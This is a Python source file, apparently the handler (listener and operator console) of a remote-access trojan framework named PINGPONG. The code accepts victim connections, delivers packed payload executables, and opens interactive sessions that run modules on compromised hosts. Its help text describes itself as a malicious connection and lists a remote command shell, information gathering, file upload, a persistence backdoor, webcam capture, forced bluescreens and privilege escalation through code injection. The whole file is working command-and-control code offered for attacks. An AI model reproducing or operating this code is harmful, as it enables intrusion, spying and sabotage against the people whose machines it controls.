# -*- coding:utf-8 -*-
# @FileName  :handler.py
# @Time      :2022/11/07 21:23:35
# @Author    :D0WE1L1N
import socket
# import threading
import sys
import main, config_set
import ctypes
import os
import inspect
import payload.payload_packer
def _async_raise(tid, exctype):
	"""raises the exception, performs cleanup if needed"""
	tid = ctypes.c_long(tid)
	if not inspect.isclass(exctype):
		exctype = type(exctype)
	res = ctypes.pythonapi.PyThreadState_SetAsyncExc(tid, ctypes.py_object(exctype))
	if res == 0:
		raise ValueError("invalid thread id")
	elif res != 1:
	# """if it returns a number greater than one, you're in trouble,
	# and you should call it again with exc=NULL to revert the effect"""
		ctypes.pythonapi.PyThreadState_SetAsyncExc(tid, None)
		raise SystemError("PyThreadState_SetAsyncExc failed")
def stop_thread(thread):
	_async_raise(thread.ident, SystemExit)
#开启监听
#函数中printf参数决定时候进行不必要的输出
def startserver(printf, ip='127.0.0.1', port='624', is_input=False, is_auto=True):
	global g_is_auto, connect_pool, t
	connect_pool = main.get_value('connect_pool')
	if connect_pool == None:
		connect_pool = []
		main.set_config('connect_pool', connect_pool)
	g_is_auto = is_auto
	config_list = ["listen_Default_ip", "listen_Default_port", "Autocommand"]
	handler_d = main.get_value('handler')
	load_config(config_list, handler_d)
	if is_input:
		ip = input(f"handler>[*]Please input the IP for the attack machine(blank for {listen_Default_ip})>")
		main.back_to_main(ip)
		port = input(f"handler>[*]Please input the PORT(blank for {listen_Default_port})>")
		main.back_to_main(port)
	if port == "":
		port = listen_Default_port
	if ip == "":
		ip = listen_Default_ip
	try:
		port = int(port)
	except:
		main.print_error("handler>[-]port input error")
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		try:
			s.bind((ip, port))
			s.listen(10)
		except socket.error as msg:
			main.print_error(f"handler>[-]{msg}")
			main.print_error("handler>[-]Failed to bind on " + ip + ":" + str(port))
			main.print_normal(f"handler>[*]Bind on {listen_Default_ip}:{listen_Default_port}")
			startserver(True, listen_Default_ip, listen_Default_port)
	except socket.error as msg:
		main.print_error("handler>[-]something went WRONG, print out the wrong msg: " + str(msg))
		sys.exit(1)
	if printf:
		main.print_normal('handler>[*]Starting handler at ' + ip + ":" + str(port))
	while True:
		try:
			conn, addr = s.accept()
		except KeyboardInterrupt:
			main.print_normal("handler>[*]Stoping......")
			main.main()
		_basic_ip = addr[0]
		conn.send(b'OK')
		_type = conn.recv(1024).decode('utf8')
		conn.send(b'OK')
		if _type == 'basic_conn':
			len_id = conn.recv(1024).decode('utf8')
			conn.send(b'OK')
			payload_id = conn.recv(int(len_id)).decode('utf8')
			_payload_id_with_exe = payload_id + '.exe'
			if os.path.isfile(f'./payload/upload_payload/{_payload_id_with_exe}'):
				conn.send(b'OK')
				with open(f'./payload/upload_payload/{_payload_id_with_exe}', 'rb') as f:
					se_data = f.read()
					main.print_normal(f'handler>[*]Sending bytes ({len(se_data)} bytes) to {_basic_ip}')
					conn.send(bytes(str(len(se_data)), 'utf8'))
					conn.recv(1024)
					conn.send(se_data)
					conn.close()
					s.close()
					_start(ip, port, printf, True)
					break
			else:
				conn.send(b'wait')
				main.print_error('handler>[-]The payload is missing!')
				main.print_normal('handler>[*]Makeing it again, using the current settings......')
				upx_dir = input("handler>[*]Please input the upx_dir>")
				payload.payload_packer.pack("PINGPONG_payload/PINGPONG_payload", True, upx_dir, '.exe', is_ask=False, is_ask_ip=ip, is_ask_port=port, is_basic_payload=True, _payload_id=payload_id, is_return_main=False)
				conn.send(b'OK')
				with open(f'./payload/upload_payload/{_payload_id_with_exe}', 'rb') as f:
					se_data = f.read()
					main.print_normal(f'handler>[*]Sending bytes ({len(se_data)} bytes) to {_basic_ip}')
					conn.send(bytes(str(len(se_data)), 'utf8'))
					conn.recv(1024)
					conn.send(se_data)
					conn.close()
					s.close()
					_start(ip, port, printf, True)
					break
		elif _type == 'PAYLOAD':
			_start(ip, port, printf, False, conn=conn, addr=addr)
			break

def _start(ip, port, printf, is_recv, conn='', addr=''):
	if is_recv:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		s.bind((ip, port))
		s.listen(10)
	while True:
		if is_recv:
			conn, addr = s.accept()
			conn.recv(1024)
		_ip = addr[0]
		_port = addr[1]
		connect_pool.append([conn, ip, port, _ip, _port, 'PINGPONG session'])
		id = len(connect_pool)
		# PINGPONG_script.upload.Upload(_ip, "./payload/upload_payload/PINGPONG_payload.exe", "D:/TEMP", False, False, conn, "")
		if printf:
			main.print_normal(f'handler>[*]PINGPONG session {id} Created: ' + ip + ":" + str(port) + " >>> " + _ip + ":" + str(_port))
		# t = threading.Thread(target=PINGPONG_shell, args=(conn, ip, port, _ip, str(_port), True, AUTORUNSCRIPT, open_ac))
		# t.start()
		main.set_config('connect_pool', connect_pool)
		PINGPONG_shell(conn, ip, port, _ip, str(_port), True, Autocommand)
#连接程序
def PINGPONG_shell(conn, my_ip, my_port, ip, port, printf, Autocommand):
	#请求发送函数：检查连接
	# session_pool = main.get_value('connect_pool')
	# my_id = session_pool.index([conn, my_ip, my_port, ip, port, 'PINGPONG session']) + 1
	global addr, my_addr
	addr = (ip, port)
	my_addr = (my_ip, int(my_port))
	import PINGPONG_script.addsend
	def basic_choice(var):
		if var == '33':
			main.print_normal('PINGPONG[*]>backgrounding session......')
			if PINGPONG_script.addsend.App_send('BG_APP', False, conn, addr, my_addr):
				main.main()
		elif var == '66':		
			print_help()
		elif var == '99':
			conn.send(bytes("EXIT_APP", 'utf8'))
			main.print_normal("PINGPONG>[*]PINGPONG session Died, reason: User exit")
			main.print_normal("handler>[*]Back to main console......")
			connect_pool = main.get_value('connect_pool')
			connect_pool.remove([conn, my_ip, my_port, ip, int(port),'PINGPONG session'])
			main.set_config('connect_pool', connect_pool)
			conn.close()
			main.main()
			stop_thread(t)
		elif var == 'PING':
			if PINGPONG_script.addsend.App_send("CHECK_APP", False, conn, addr, my_addr):
				main.print_normal("PINGPONG>[*]PONG")
		elif var == '' or var == ' ':
			ask_for_choice()
		else:
			return True
	def print_help():
		main.print_normal("""
PINGPONG>[*]the PINGPONG shell is a malicious connection and it will start when you use the listener to listen the ip and port which your payload set
	usage:
		the usage of the shell is set when you generate the payload
		a PINGPONG payload must have those usage:
			exit : exit the connection
			help : for help
			show_usage : print out the usage(s) the payload has
			PING : check the connection. If it is good, return PONG
			info : printout the ip and port of both the hosts
			bg : background the PINGPONG session
		the below usage will be activate if u set it when u are generating the payload
		if u have this usage, type command to use it:
			basic command:
				cmd : make a cmd connection
				getinformation : to obtain some information(priv, username, etc.) of this connection
				upload : upload your file
				persistence_service : leave a backdoor on the attacked host
			media:
				cam_shot : take shot
			special_attacks:
				bluescreen : make a bluescreen on the attacked host
			priv:
				priv_vbp_listen : when a high-priv file(.vbs .bat .psl) is created, inject code which can make your priv higher""")

	def ask_for_choice(list=False, print_out=True):
		if PINGPONG_script.addsend.App_send("SHOW_ALL_USAGE_APP", False, conn, addr, my_addr):
			all_mod_usage_dict = {}
			mods = []
			script_path = os.path.dirname(os.path.abspath(__file__))
			for mod in os.listdir('./PINGPONG_script'):
				if os.path.isdir(os.path.join(script_path, 'PINGPONG_script', mod)) and mod != "__pycache__":
					mods.append(mod)
					scripts = []
					for scr in os.listdir(f'./PINGPONG_script/{mod}'):
						usage = os.path.splitext(scr)[0]
						if scr != 'TEMP' and scr != 'SOURCE_FILE':
							scripts.append(usage)
					all_mod_usage_dict[mod] = scripts
			conn.send(b'OK')
			amount_of_usage = conn.recv(1024)
			conn.send(b'OK')
			i = 0
			usage_list = []
			while i < int(amount_of_usage.decode('utf8')):
				usage = conn.recv(1024)
				usage_list.append(usage.decode('utf8'))
				conn.send(b'OK')
				i += 1
			all_usage = []
			for tmp in all_mod_usage_dict.keys():
				all_usage += tmp
			if print_out:
				if list:
					main.print_normal(f'''PINGPONG>[*]usage : {usage_list}''')
				else:
					main.print_normal(''' 
	---------------------PINGPONG usage---------------------
	''')
					main.print_normal("Connection: " + my_ip + ":" + str(my_port) + " >>> " + ip + ":" + str(port))
				id_count = 0
				mod_id_dst = {}
				for _mod in mods:
					id_count += 1
					if print_out:
						main.print_good(f'	{str(id_count)}) {_mod}')
						mod_id_dst[str(id_count)] = _mod
				if print_out:
					main.print_good('	33) background')
					main.print_good('   	66) help')
					main.print_good('   	99) exit')
				mod_choice = input('PINGPONG>')
				def load_mod(_mod_choice, conn, addr, my_addr):
					if not _mod_choice in mod_id_dst.keys():
						main.print_error('PINGPONG>[-]No such choice')
						return False
					modl = mod_id_dst[_mod_choice]
					mod_usage_list = []
					for usage in usage_list:
						if usage in all_mod_usage_dict[modl]:
							mod_usage_list.append(usage)
					if mod_usage_list == []:
						main.print_error('PINGPONG>[-]This payload does not have activate usage in this mod')
						ask_for_choice(print_out=False)
						return True
					id_count = 0
					script_id_dst = {}
					for _usage in mod_usage_list:
						id_count += 1
						main.print_good(f'  	{id_count}) {_usage}')
						script_id_dst[id_count] = _usage
					main.print_good(f'	99) back')
					script_choice = input("PINGPONG>")
					try:
						script_choice = int(script_choice)
					except:
						main.print_error("PINGPONG>[-]No such choice")
					if script_choice in [i for i in range(1, id_count+1)]:
						script = script_id_dst[script_choice]
						exec(f'import PINGPONG_script.{modl}.{script}')
						exec(f'PINGPONG_script.{modl}.{script}.run(conn, addr, my_addr)')
					elif script_choice == 99:
						ask_for_choice()
				if basic_choice(mod_choice):
					load_mod(mod_choice, conn, addr, my_addr)
	while True:
		if Autocommand and g_is_auto and Autocommand != '' and Autocommand != ' ':
			main.print_normal("PINGPONG>[*]running " + Autocommand)
			command = Autocommand
			Autocommand = False
		else:
			ask_for_choice()               
def load_config(config_list, d):
	local_var = globals()
	for con in config_list:
		data = d[con]
		local_var[f'{con}'] = data
		# print(f'{con} : {data}')